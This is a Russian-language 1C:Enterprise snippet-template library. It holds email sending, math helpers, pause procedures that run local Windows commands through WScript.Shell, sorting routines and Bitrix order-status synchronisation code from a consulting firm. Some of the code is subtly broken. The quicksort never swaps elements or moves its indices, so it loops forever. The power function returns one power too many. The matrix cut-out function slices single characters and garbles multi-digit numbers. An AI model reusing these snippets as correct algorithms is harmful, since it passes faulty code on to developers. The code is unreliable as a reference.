	Профиль = Справочники.УчетныеЗаписиЭлектроннойПочты.СистемнаяУчетнаяЗаписьЭлектроннойПочты;
	
//  ПараметрыОтправки - Структура - содержит всю необходимую информацию о письме:
//
//   * Кому - Массив, Строка - интернет адреса получателей письма.
//          - Массив - коллекция структур адресов:
//              * Адрес         - Строка - почтовый адрес (должно быть обязательно заполнено).
//              * Представление - Строка - имя адресата.
//          - Строка - интернет адреса получателей письма, разделитель - "";"".
//
//   * ПолучателиСообщения - Массив - массив структур, описывающий получателей:
//      ** Адрес - Строка - Почтовый адрес получателя сообщения.
//      ** Представление - Строка - представление адресата.
//
//   * Копии        - Массив, Строка - адреса получателей копий письма. См. описание поля Кому.
//
//   * СкрытыеКопии - Массив, Строка - адреса получателей скрытых копий письма. См. описание поля Кому.
//
//   * Тема       - Строка - (обязательный) тема почтового сообщения.
//   * Тело       - Строка - (обязательный) текст почтового сообщения (простой текст в кодировке win-1251).

	ПараметрыОтправки = Новый Структура();
	ПараметрыОтправки.Вставить(""Кому"", АдресаПолучателей); // вида, ""йцу@mail.ru"" или несколько через "";"" 
	ПараметрыОтправки.Вставить(""Тема"", ""Синхронизация с Битрикс"");
	ПараметрыОтправки.Вставить(""Тело"", ""Синхронизация с Битрикс в активном состоянии."");
	
	Попытка
		РаботаСПочтовымиСообщениями.ОтправитьПочтовоеСообщение(Профиль, ПараметрыОтправки);
		
		//ЗаписьЖурналаРегистрации(""Фоновое задание.Отправка письма"", 
		//УровеньЖурналаРегистрации.Информация, Метаданные.ОбщиеМодули.АйТи_Б24_ОбменСПорталомСервер, , ""(АйТи, Б24) Отправка письма о запущенной синхронизации"");
	Исключение
		Сообщить(""Синхронизация с Битрикс. Не удалось подключиться к серверу"");
		Сообщить(ОписаниеОшибки());
	КонецПопытки;
	
КонецФункции // ОтправитьПисьмо()"}
}
},
{6,
{"Математические",1,0,"",""},
{0,
{"Инкремент",0,0,"+=","<?""Переменная""> 	= <?""Переменная""> + 1;"}
},
{0,
{"Декремент",0,0,"-=","<?""Переменная""> 	= <?""Переменная""> - 1;"}
},
{0,
{"Умножить",0,0,"*=","<?""Переменная""> 	= <?""Переменная""> * <?""Умножить на"">;"}
},
{0,
{"Разделить",0,0,"/=","<?""Переменная""> 	= <?""Переменная""> / 1;"}
},
{0,
{"ОстатокОтДеления",0,0,"","ОстатокОтДеления 	= <?""Делимое""> - Цел(<?""Делимое""> / <?""Делитель"">) * <?""Делитель"">;
ОстатокОтДеления 	= <?""Делимое""> % <?""Делитель"">;"}
},
{0,
{"Математические",0,0,"","//Функция считает детерминант матрицы 3 на 3 
//-------------------------------------------------------------------------
//Матрица3На3 - двумерный массив (3на3),
//Возврат - число;
//-------------------------------------------------------------------------
//автор: Макаров А.
Функция Детерминат(Матрица3На3)
	
	Дет = 	Число(Матрица3На3[0][0]) * (Число(Матрица3На3[1][1]) * Число(Матрица3На3[2][2]) - Число(Матрица3На3[1][2]) * Число(Матрица3На3[2][1]))
			-	Число(Матрица3На3[0][1]) * (Число(Матрица3На3[1][0]) * Число(Матрица3На3[2][2]) - Число(Матрица3На3[1][2]) * Число(Матрица3На3[2][0])) 
			+ Число(Матрица3На3[0][2]) * (Число(Матрица3На3[1][0]) * Число(Матрица3На3[2][1]) - Число(Матрица3На3[1][1]) * Число(Матрица3На3[2][0]));
	
	Возврат Дет;
	
КонецФункции

//Функция производит ""вырезание""  матрицы 3 на 3 из исходной 4 на 4
//-------------------------------------------------------------------------
//Матрица4На4 - двумерный массив (4на4),
//i - число, ""вырезаемый столбец"",
//j - число, ""вырезаемая строка"",  
//Возврат - число;
//-------------------------------------------------------------------------
//автор: Макаров А.
Функция ВырезаниеМатрицы(Матрица4На4, i, j)
	
	МассивВСтроке = """";
	
	Для строка=0 По Матрица4На4.ВГраница() Цикл
		Для столбец=0 По Матрица4На4[строка].Вграница() Цикл
			Если  НЕ (строка = i  ИЛИ столбец = j) Тогда
				МассивВСтроке = МассивВСтроке + Матрица4На4[строка][столбец]
			КонецЕсли;	
		КонецЦикла;
	КонецЦикла;
	
	Матрица3На3 = Новый Массив(3, 3);
	
	С = 1;  л = """";
	
	Для строка=0 По Матрица3На3.ВГраница() Цикл
		Для столбец=0 По Матрица3На3[строка].Вграница() Цикл
			Матрица3На3[строка][столбец] = (Сред(МассивВСтроке, с,1));
			С= С +1;
			л = л +"" "" +Матрица3На3[строка][столбец];
		КонецЦикла;
		л = """";
	КонецЦикла;
	
	Возврат  Матрица3На3;
	
КонецФункции

//Функция возводит число в степень
//-------------------------------------------------------------------------
//Основание - число,
//Степень - число,
//Возврат - число;
//-------------------------------------------------------------------------
//автор: Макаров А.
Функция ЧислоВСтепени(Основание,Степень)
	
	к = 1;
	Результат = Основание;
	
	Пока к <=Степень Цикл
		
		Результат = Результат * Основание;
		к = к +1; 	
		
	КонецЦикла; 
	
	Возврат Результат;
	
КонецФункции
"}
}
},
{3,
{"Время",1,0,"",""},
{2,
{"Пауза",1,0,"",""},
{0,
{"Пауза",0,0,"","Процедура СделатьПаузу(ЗадержкаСекунд = 3, Вариант = ""Ping"")
	
    Если ЗадержкаСекунд = 0 Тогда
        Возврат
    КонецЕсли;
	
	Если ТранзакцияАктивна() Тогда
		ЗафиксироватьТранзакцию();
	КонецЕсли;
	
	Сообщить(""начало: ""+ТекущаяДата());
	
	Если Вариант = ""Ping"" Тогда
		
		СтрокаЗапроса = ""ping -n 1 -w ""+Формат(1000 * ЗадержкаСекунд, ""ЧДЦ=0; ЧГ="") + "" 127.255.255.255""; 
		WshShell = Новый COMОбъект(""WScript.Shell""); 
		WshShell.Run(СтрокаЗапроса, 0, -1); 
		
	ИначеЕсли Вариант = ""smaharbA"" Тогда
		
		Для к = 1 По ЗадержкаСекунд Цикл
			ПолучитьCOMОбъект(""winmgmts:"").ExecNotificationQuery(""Select * from __instancemodificationevent where TargetInstance isa 'Win32_UTCTime'"").NextEvent();
		КонецЦикла;
		
	ИначеЕсли Вариант = ""Пустой цикл"" Тогда
		
		// грузит процессор
		ДатаВыхода = ТекущаяДата() + ЗадержкаСекунд;
		Пока ТекущаяДата() < ДатаВыхода Цикл
			ОбработкаПрерыванияПользователя();
		КонецЦикла;
		
	ИначеЕсли Вариант = ""Sleep"" Тогда
		
		// не работает
		
		scr = Новый ComОбъект(""WScript.Shell""); 
		scr.Run(""sleep ""+Формат(ЗадержкаСекунд, ""ЧДЦ=0; ЧГ=""), 0, 1);
		
	ИначеЕсли Вариант = ""SleepJs"" Тогда
		
		// работает
		
		Скрипт = Новый ТекстовыйДокумент(); 
		Скрипт.УстановитьТекст 
		( 
		""if (WScript.Arguments.Count()==0) 
		| WScript.Quit(); 
		|else 
		| if (isNaN(parseInt(WScript.Arguments(0)))) 
		| WScript.Quit(); 
		|WScript.Sleep(WScript.Arguments(0));"" 
		); 
		Скрипт.Записать(КаталогВременныхФайлов()+""sleep.js"", КодировкаТекста.ANSI); 
		WshShell = Новый COMОбъект(""wscript.shell""); 
		WshShell.Run(""wscript.exe """"""+КаталогВременныхФайлов()+""sleep.js"""" ""+Формат(ЗадержкаСекунд*1000,""ЧГ=0""), 0, -1); 
		УдалитьФайлы(КаталогВременныхФайлов()+""sleep.js""); 
		
	ИначеЕсли Вариант = ""SleepVbs"" Тогда
		
		// работает
		
		Сигнатура = Формат(ТекущаяДата(), ""ДФ=yyyyMMddhhmmss"");
		ПутьСкрипта = КаталогВременныхФайлов()+""SleepScript""+Сигнатура+"".vbs"";
		СкриптФайл = Новый ТекстовыйДокумент;
		СкриптФайл.ДобавитьСтроку(""WScript.Sleep(""+Формат(ЗадержкаСекунд*1000, ""ЧГ=0"")+"")"");
		СкриптФайл.Записать(ПутьСкрипта, КодировкаТекста.OEM);
		WSHShell = Новый COMОбъект(""WScript.Shell"");
		WSHShell.Run(""wscript.exe """"""+ПутьСкрипта+"""""""", 0, 1);
		УдалитьФайлы(ПутьСкрипта);
		
	ИначеЕсли Вариант = ""TimeoutWS"" Тогда
		
		// работает
		
		КомандаWindows = ""Timeout /T "" + Формат(ЗадержкаСекунд, ""ЧГ=0"") + "" /NoBreak"";
		
		WshShell = Новый COMОбъект(""WScript.Shell""); 
		WshShell.Run(КомандаWindows, 0, -1);
		
	ИначеЕсли Вариант = ""Timeout"" Тогда
		
		// работает, показывает черное окно
		
		КомандаWindows = ""Timeout /T "" + Формат(ЗадержкаСекунд, ""ЧГ=0"") + "" /NoBreak"";
		ЗапуститьПриложение(КомандаWindows,,Истина);
		
	ИначеЕсли Вариант = ""DynamicWrapper"" Тогда
		
		// нужна библиотека
		
		Wrapper = Новый ComОбъект(""DynamicWrapper""); 
		Wrapper.Register(""KERNEL32.DLL"", ""Sleep"", ""i=l"", ""f=s""); 
		
		Wrapper.Sleep(ЗадержкаСекунд);
		
	КонецЕсли;
	
	Сообщить(""^^^^^^: ""+ТекущаяДата());
		
КонецПроцедуры"}
},
{0,
{"Пауза мини",0,0,"","Процедура Пауза(Длительность) Экспорт
	ДатаНачалаОперации = ТекущаяДата();
	Пока ТекущаяДата() - ДатаНачалаОперации < Длительность Цикл
	КонецЦикла;
КонецПроцедуры"}
}
},
{0,
{"MSScriptControl.ScriptControl",0,0,"","Scr = Новый COMОбъект(""MSScriptControl.ScriptControl""); 
Scr.Language = ""javascript""; 

ВремяНачалаВыполнения = Scr.Eval(""new Date().getTime()"");

//выполнить код

ВремяКонцаВыполнения = Scr.Eval(""new Date().getTime()"");
ВремяВыполнения = ВремяКонцаВыполнения - ВремяНачалаВыполнения; //время в милисекундах"}
},
{0,
{"Позже",0,0,"","Функция ПозжеЧаса(Час)
	
	Если Час<=Час(ТекущаяДата()) Тогда
		Возврат Истина;
	КонецЕсли;
	Возврат Ложь;
	
КонецФункции"}
}
},
{4,
{"Сортировка",1,0,"",""},
{0,
{"СортировкаПузырьком",0,0,"","Функция СортировкаПузырьком(МассивЭлементов) Экспорт
	
    // Количество просмотров массива - по количеству числа его элементов
    Для просмотр = 0 По МассивЭлементов.Количество()-1 Цикл
        // Собственно, просмотр массива
        Для индекс = 0 По МассивЭлементов.Количество()-1 Цикл
            // Если достигли конца массива то прервём цикл,
                        // чтобы не выполнять условие ниже
            Если индекс = МассивЭлементов.Количество()-1 Тогда
                Прервать;
            КонецЕсли;
            // Сравнение элементов и их перестановка (если требуется)
            Если МассивЭлементов[индекс] > МассивЭлементов[индекс+1] Тогда
                СтаршийЭлемент = МассивЭлементов[индекс];
                МладшийЭлемент = МассивЭлементов[индекс+1];
                МассивЭлементов[индекс] = МладшийЭлемент;
                МассивЭлементов[индекс+1] = СтаршийЭлемент;
            КонецЕсли;
        КонецЦикла;
	КонецЦикла;
	
    Возврат МассивЭлементов;
	
КонецФункции"}
},
{0,
{"ЕстьИзменения",0,0,"","ЕстьИзменения = Ложь;

Если НЕ ЕстьИзменения Тогда
	ЕстьИзменения = Истина;
КонецЕсли; 

Если ЕстьИзменения Тогда
	ДокументОбъект.Записать();
КонецЕсли;"}
},
{0,
{"БыстраяСортировка",0,0,""," //Алгоритм ""Быстрая сортировка"" { 
 Процедура б_Сортировка(Массив,НижнийПредел,ВерхнийПредел)
	 
	 i    = НижнийПредел;
	 j    = ВерхнийПредел;
	 m    = Массив[Цел((i+j)/2)];
	 
	 Пока Истина Цикл        
		 Пока Массив[i] < m Цикл            
			 i    = i + 1;                   
		 КонецЦикла;
		 
		 Пока Массив[j] > m Цикл            
			 j    = j - 1;                   
		 КонецЦикла; 
		 
		 Если i > j Тогда                       
			 Прервать;                        
		 КонецЕсли;
		 
	 КонецЦикла;
	 
	 Если НижнийПредел < j Тогда         
		 б_Сортировка(Массив,НижнийПредел,j);        
	 КонецЕсли; 
	 
	 Если i < ВерхнийПредел Тогда                      
		 б_Сортировка(Массив,i,ВерхнийПредел);        
	 КонецЕсли;
	 
 КонецПроцедуры
 
 Функция БыстраяСортировка(Массив)
	 
	 НижняяГраница = 0;
	 ВерхняяГраница = Массив.ВГраница();    
	 б_Сортировка(Массив,НижняяГраница,ВерхняяГраница);
	 
	 Возврат Массив;
	 
 КонецФункции"}
},
{0,
{"СортировкаСпискомЗначений",0,0,"","//Сортировка списком значений {---
Функция СортировкаСпискомЗначений(Знач Массив)
	
	мСписокЗнч = Новый СписокЗначений;
	мСписокЗнч.ЗагрузитьЗначения(Массив);
	мСписокЗнч.СортироватьПоЗначению(НаправлениеСортировки.Возр);
	
	Возврат мСписокЗнч.ВыгрузитьЗначения();
	
КонецФункции"}
}
},
{5,
{"Битрикс",1,0,"",""},
{0,
{"Запрос для свойств",0,0,"","Запрос = новый Запрос;
Запрос.МенеджерВременныхТаблиц = [МенеджерВременныхТаблиц];
Запрос.Текст = ""ВЫБРАТЬ
|	ВремЗначенияСвойствТоваровДляВыгрузкиРеквизитовПоПользовательсокмуАлгоритму.Значение
|ИЗ
|	ВремЗначенияСвойствТоваровДляВыгрузкиРеквизитовПоПользовательсокмуАлгоритму
|ГДЕ
|	ВремЗначенияСвойствТоваровДляВыгрузкиРеквизитовПоПользовательсокмуАлгоритму.Номенклатура = &Номенклатура
|	И ВремЗначенияСвойствТоваровДляВыгрузкиРеквизитовПоПользовательсокмуАлгоритму.Свойство.Наименование ПОДОБНО &Свойство + """"%"""""";

Запрос.УстановитьПараметр(""Номенклатура"", [Номенклатура]);
Запрос.УстановитьПараметр(""Свойство"", ""Белки"");  

ВыполненныйЗапрос = Запрос.Выполнить();

Если ВыполненныйЗапрос.Пустой() тогда
	[Результат] = 0;
Иначе
	Выборка = ВыполненныйЗапрос.Выбрать();
	Пока Выборка.Следующий() Цикл
		[Результат] = Строка(Выборка.Значение);
		Прервать;
	КонецЦикла;
КонецЕсли;"}
},
{0,
{"БУС АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами",0,0,"","// Если нету предопределённого АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами, то его заполним
АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами = Справочники.ВидыКонтактнойИнформации.АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами;
ЗаполненТип = ЗначениеЗаполнено(АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами.Тип);
ЗаполненВидОбъектаКонтактнойИнформации = ЗначениеЗаполнено(АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами.ВидОбъектаКонтактнойИнформации);
ОбработатьОбъект = НЕ ЗаполненТип ИЛИ НЕ ЗаполненВидОбъектаКонтактнойИнформации;

Если ОбработатьОбъект Тогда
	АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами = АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами.ПолучитьОбъект();
КонецЕсли; 
Если НЕ ЗаполненТип Тогда
	АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами.Тип 	= Перечисления.ТипыКонтактнойИнформации.АдресЭлектроннойПочты;
КонецЕсли;
Если НЕ ЗаполненВидОбъектаКонтактнойИнформации Тогда
	АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами.ВидОбъектаКонтактнойИнформации = Перечисления.ВидыОбъектовКонтактнойИнформации.Контрагенты;
КонецЕсли;
Если ОбработатьОбъект Тогда
	АдресЭлектроннойПочтыКонтрагентаДляОбменаДокументами.Записать();
КонецЕсли;"}
},
{0,
{"ПроверитьДанныеКонтрагента, , если они не указаны в настройках",0,0,"","Процедура ЗагрузитьДокументы(ПараметрыОбмена, ТзнДокументов, ДокументXDTO)
	
	// Типовое
	
	//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ № <?""№""> >> Загрузка данных контрагента из ЗначенияРеквизитов, если они не указаны в настройках
	НовСтрЗначенияРеквизитов = НовСтр.ЗначенияРеквизитов;
	
	Если НовСтр.Контрагент <> Неопределено Тогда
		ПроверитьДанныеКонтрагента(НовСтрЗначенияРеквизитов, НовСтр.Контрагент.ИНН, ""ИНН"");	
		ПроверитьДанныеКонтрагента(НовСтрЗначенияРеквизитов, НовСтр.Контрагент.Наименование, ""Название компании"");
		ПроверитьДанныеКонтрагента(НовСтрЗначенияРеквизитов, НовСтр.Контрагент.НаименованиеПолное, ""Название компании"");	
	КонецЕсли; 
	//--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ № <?""№""> № ИС00-004705
	
КонецПроцедуры

//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ № <?""№"">
Процедура ПроверитьДанныеКонтрагента(НовСтрЗначенияРеквизитов, Параметр, ЕгоИмяВДопРеквизите)
	
	Если НЕ ЗначениеЗаполнено(Параметр) Тогда
		
		НайденнаяСтрока = НовСтрЗначенияРеквизитов.Найти(ЕгоИмяВДопРеквизите, ""Наименование"");
		Если НайденнаяСтрока <> Неопределено Тогда
			Параметр = НайденнаяСтрока.Значение;
		КонецЕсли;
		
	КонецЕсли;
	
КонецПроцедуры
//АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ № <?""№"">"}
},
{4,
{"БУС",1,0,"",""},
{5,
{"КА",1,0,"",""},
{0,
{"ЗадатьСтатусЗаказа",0,0,"","// Недостающие методы в папке Запрос -\ ЗначенияСвойствОбъектов

Процедура АйТи_ПриПроведенииЗаказПокупателяОбработкаПроведения(Источник, Отказ, РежимПроведения) Экспорт
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникЗаказПодтвержден 	= Источник.ЗаказПодтвержден;
	ИсточникДатаПодтверждения 	= Источник.ДатаПодтверждения;
	
	Если ИсточникЗаказПодтвержден И ЗначениеЗаполнено(ИсточникДатаПодтверждения) Тогда
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		НазначениеСвойств 		= ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Документ_ЗаказПокупателя;
		ЗначениеСвойстваЗаказа 	= ПолучитьЗначениеСвойстваОбъекта(ИсточникСсылка, КодСвойстваЗаказа, НазначениеСвойств);
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000233""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		//ЗначениеСвойстваНовый 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
		//ЗначениеСвойстваПодтвержден 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойстваПодтвержден);
		//
		//СвойствоЗаказаУспех 	= ЗаписатьЗначениеСвойства(ИсточникСсылка, КодСвойстваЗаказа, ЗначениеСвойстваПодтвержден); 
		//СвойствоДатаОплатыУспех 	= ЗаписатьЗначениеСвойства(ИсточникСсылка, КодСвойстваДатаОплаты, Справочники.ЗначенияСвойствОбъектов.ПустаяСсылка()); 
		
		ЗадатьСтатусЗаказа(ИсточникСсылка, КодСвойстваЗаказа, КодЗначенияСвойстваОплаченКОтгрузке);
		
		//Сообщить(""Изменён стутус для синхронизации с Битрикс на 'Подтвержден'"");
	Иначе
		
	КонецЕсли;
	
КонецПроцедуры

//Функция ЗадатьСтатусЗаказа
//-------------------------------------------------------------------------
//Параметры:
//		Объект - Ссылка - Ссылка на объект, свойство которого надо получить
//		КодСвойстваЗаказа - Строка - Код свойства, значения которого меняем
//		КодЗначенияСвойства - Строка - Код свойства, значения которого пристваиваем
//		СтиратьДатуОплаты - Булево - Стирать дату, т.к. в случает даты заказ будет в статусе ""оплачен""
//Возвращаемое значение:
//		Булево - Истина, если изменение успешно
//-------------------------------------------------------------------------
//автор: КучеровРМ 07.09.2018
Функция ЗадатьСтатусЗаказа(Объект, КодСвойстваЗаказа, КодЗначенияСвойства, СтиратьДатуОплаты = Истина)

	ЗначениеСвойства 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойства);
	ИзменениеУспех 		= ЗаписатьЗначениеСвойства(Объект, КодСвойстваЗаказа, ЗначениеСвойства); 
	
	Если СтиратьДатуОплаты Тогда
	
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(Объект, КодСвойстваДатаОплаты, Справочники.ЗначенияСвойствОбъектов.ПустаяСсылка());
	
	КонецЕсли; 
	
	Возврат ИзменениеУспех;
	
КонецФункции // ЗадатьСтатусЗаказа()"}
},
{0,
{"Задать статус заказа при оплате",0,0,"","
Функция ЕстьОплатаЗаказа(ЗаказПокупателяСсылка)
	
	ЕстьОплатаЗаказа = Ложь;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ПлатежноеПоручениеВходящее.Ссылка,
	|	ПлатежноеПоручениеВходящее.ДокументОснование,
	|	ПлатежноеПоручениеВходящее.ДатаОплаты
	|ИЗ
	|	Документ.ПлатежноеПоручениеВходящее КАК ПлатежноеПоручениеВходящее
	|ГДЕ
	|	ПлатежноеПоручениеВходящее.ДокументОснование = &ДокументОснование
	|	И ПлатежноеПоручениеВходящее.Оплачено"";
	
	Запрос.УстановитьПараметр(""ДокументОснование"", ЗаказПокупателяСсылка);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ЕстьОплатаЗаказа = Истина;
	КонецЕсли; 
	
	Возврат ЕстьОплатаЗаказа
	
КонецФункции // ЕстьОплатаЗаказа()

Процедура АйТи_ПриПроведенииПлатежноеПоручениеОбработкаПроведения(Источник, Отказ, РежимПроведения) Экспорт
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникОплачено 	= Источник.Оплачено;
	ИсточникДатаОплаты 	= Источник.ДатаОплаты;
	ИсточникЗаказПодтвержден 	= Источник.ЗаказПодтвержден;
	
	ИсточникРасшифровкаПлатежа = Источник.РасшифровкаПлатежа;
	
	Сделка = Неопределено;
	Если ИсточникРасшифровкаПлатежа.Количество() > 0 Тогда
		Сделка = ИсточникРасшифровкаПлатежа[0].Сделка;
	КонецЕсли;
	
	КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
	
	
	Если ЗначениеЗаполнено(Сделка) Тогда
		СделкаЗаказПодтвержден 	= Сделка.ЗаказПодтвержден;
		
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000233""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		Если НЕ СделкаЗаказПодтвержден Тогда
			Если ИсточникОплачено ИЛИ ЕстьОплатаЗаказа(Сделка) Тогда
				ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваОплаченКОтгрузке);
				//Если ЗначениеЗаполнено(ИсточникДатаОплаты) Тогда
				//	НоваяДатаЗаказа 		= Формат(ИсточникДатаОплаты, ""ДФ=yyyy-MM-ddTHH:mm:ss"");
				//	СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(Сделка, КодСвойстваДатаОплаты, НоваяДатаЗаказа);
				//КонецЕсли;
			Иначе
				ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
			КонецЕсли;
		Иначе
			ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваПодтвержден);	
		КонецЕсли; 
	КонецЕсли;
	
КонецПроцедуры

Процедура АйТи_ПриПроведенииРеализацияТоваровУслугОбработкаПроведения(Источник, Отказ, РежимПроведения) Экспорт
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникПроведен 	= Источник.Проведен;
	ИсточникСделка 		= Источник.Сделка;
	
	Если НЕ ЗначениеЗаполнено(ИсточникСделка) Тогда
		Возврат;	
	КонецЕсли;
	
	КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
	
	ИсточникСделкаЗаказПодтвержден = ИсточникСделка.ЗаказПодтвержден;
	
	Если ИсточникПроведен Тогда
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000234""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОтправленКлиенту = ""000000233""; // Отправлен клиенту
		
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		Если ИсточникСделкаЗаказПодтвержден Тогда
			ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваОтправленКлиенту);
		ИначеЕсли ЕстьОплатаЗаказа(ИсточникСделка) Тогда
			ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен);
		//	Если ЗначениеЗаполнено(ИсточникДатаОплаты) Тогда
		//		НоваяДатаЗаказа 		= Формат(ИсточникДатаОплаты, ""ДФ=yyyy-MM-ddTHH:mm:ss"");
		//		СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(ИсточникСделка, КодСвойстваДатаОплаты, НоваяДатаЗаказа);
		//	КонецЕсли;
		//Иначе
		//	ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
		КонецЕсли;
	КонецЕсли;

КонецПроцедуры
"}
},
{0,
{"Модуль Статусы (загружая инфо о счетах)",0,0,"","
////////////////////////////////////////////////////////////////////////////////
// Влюбленная в свое дело команда ООО «АйТи-Консалтинг»,
// г. Ярославль, ул. Советская, д.69, к.2, этаж 1,
// тел. (4852) 59-33-33, info@allzon.ru,
// https://itcons99.ru/, http://itcons76.ru/
////////////////////////////////////////////////////////////////////////////////

#Область БитриксСтатусы
	
//+++ ====== Битрикс. Статусы [ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698 ] ================================================

////////////////////////////////////////////////////////////////////////////////
// Свойства 

Функция ЗадатьСтатусЗаказа(Объект, КодСвойстваЗаказа, КодЗначенияСвойства, СтиратьДату = Истина)

	ЗначениеСвойства 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойства);
	ИзменениеУспех 		= ЗаписатьЗначениеСвойства(Объект, КодСвойстваЗаказа, ЗначениеСвойства); 
	
	Если СтиратьДату Тогда
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(Объект, КодСвойстваДатаОплаты, """");
	КонецЕсли; 
	
	Возврат ИзменениеУспех;
	
КонецФункции // ОбновитьСтатусЗаказа()
 
Функция ЗаписатьЗначениеСвойства(ОбъектСсылка, КодСвойстваОбъекта, Значение) 
	
	НаборЗаписейЗначенияСвойств = РегистрыСведений.ЗначенияСвойствОбъектов.СоздатьНаборЗаписей();
	
	Если Значение <> Неопределено Тогда
		Запись 			= НаборЗаписейЗначенияСвойств.Добавить();
		Запись.Объект   = ОбъектСсылка;
		Свойство 		= ПланыВидовХарактеристик.СвойстваОбъектов.НайтиПоКоду(КодСвойстваОбъекта);
		Запись.Свойство = Свойство.Ссылка;
		Запись.Значение = Значение;
		
		НаборЗаписейЗначенияСвойств.Отбор.Объект.Установить(ОбъектСсылка);
		НаборЗаписейЗначенияСвойств.Отбор.Свойство.Установить(Свойство); //.Ссылка
		
		Попытка
			НаборЗаписейЗначенияСвойств.Записать();
			Возврат Истина;
		Исключение
			//Сообщить(""Не удалось записать значения свойств:"" + Символы.ПС + ОписаниеОшибки());
			Возврат Ложь;
		КонецПопытки;
	КонецЕсли;
	
	Возврат Ложь; 
	
КонецФункции

Функция ЗаписатьЗначенияСвойстваСтруктура(ОбъектСсылка, СтруктураСвойства) 
	
	НаборЗаписейЗначенияСвойств = РегистрыСведений.ЗначенияСвойствОбъектов.СоздатьНаборЗаписей();
	
	Если ЗначениеЗаполнено(СтруктураСвойства.Значение) Тогда
		Запись 			= НаборЗаписейЗначенияСвойств.Добавить();
		Запись.Объект   = ОбъектСсылка;
		Свойство 		= ПланыВидовХарактеристик.СвойстваОбъектов.НайтиПоКоду(СтруктураСвойства.КодСвойстваОбъекта);
		Запись.Свойство = Свойство.Ссылка;
		Запись.Значение = СтруктураСвойства.Значение;
	КонецЕсли;
	
	НаборЗаписейЗначенияСвойств.Отбор.Объект.Установить(ОбъектСсылка);
	НаборЗаписейЗначенияСвойств.Отбор.Свойство.Установить(Свойство); //.Ссылка
	
	Попытка
		НаборЗаписейЗначенияСвойств.Записать();
	Исключение
		Сообщить(""Не удалось записать значения свойств:"" + Символы.ПС + ОписаниеОшибки());
		Возврат Ложь;
	КонецПопытки;
	
	Возврат Истина; 
	
КонецФункции

//Функция ПолучитьЗначениеСвойстваОбъекта
//-------------------------------------------------------------------------
//Параметры:
//		Объект - Ссылка - Ссылка на объект, свойство которого надо получить
//		КодСвойстваОбъекта - Строка - Код свойства, значения которого получаем
//		НазначениеСвойств - ПланВидовХарактеристикСсылка.НазначенияСвойствКатегорийОбъектов - Напр., ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Справочник_Контрагенты
//		Параметр - Тип - описание
//Возвращаемое значение:
//		СправочникСсылка.ЗначенияСвойствОбъектов - Значение свойства
